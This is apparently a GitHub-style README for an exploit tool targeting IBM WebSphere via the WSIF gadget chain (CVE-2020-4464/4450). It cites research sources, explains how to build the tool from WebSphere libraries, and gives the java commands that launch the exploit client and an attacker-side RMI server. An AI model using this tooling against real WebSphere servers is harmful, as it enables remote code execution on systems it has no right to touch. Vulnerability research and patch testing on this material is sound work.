WSIF Gadget for WebSphere (CVE-2020-4464 / CVE-2020-4450)
=========================================================

This is based on the excellent blog posts of ZDI (original report by [@\_tint0](https://twitter.com/_tint0)):

* https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere
* https://www.zerodayinitiative.com/blog/2020/9/29/exploiting-other-remote-protocols-in-ibm-websphere

... and the work of some fine Chinese hackers (I couldn't determine the true source for the code, feel free to open an Issue if you think you deserve credit):

* https://paper.seebug.org/1315/
* https://vlambda.com/wz_7iyDatDUdvs.html
* https://cert.360.cn/report/detail?id=3d016bdef66b8e29936f8cb364f265c8


My additions (not much, really):
* Dependencies + build script
* Publicly accessible RMI service
* Little code cleanup

[FoxGlove's code](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) is pulled in as a submodule, you can use the WebSphere request file to trigger CVE-2020-4464.

You should copy the `plugins` and `runtimes` directories from WebSphere to the `lib` directory, then run `ant` to compile!

To run (Java 11):

```
java -cp .:runtimes/com.ibm.ws.orb_9.0.jar:runtimes/com.ibm.ws.admin.client_9.0.jar:plugins/com.ibm.ws.managedobject.jar:plugins/com.ibm.ws.runtime.jar:plugins/com.ibm.ws.batch.runtime.jar:plugins/javax.j2ee.ejb.jar:runtimes/com.ibm.jaxws.thinclient_9.0.jar --add-modules jdk.naming.rmi --add-exports='jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED' Test
```

```
java -cp .:plugins/com.ibm.ws.runtime.jar:runtimes/com.ibm.ws.admin.client_9.0.jar RMIServer
```
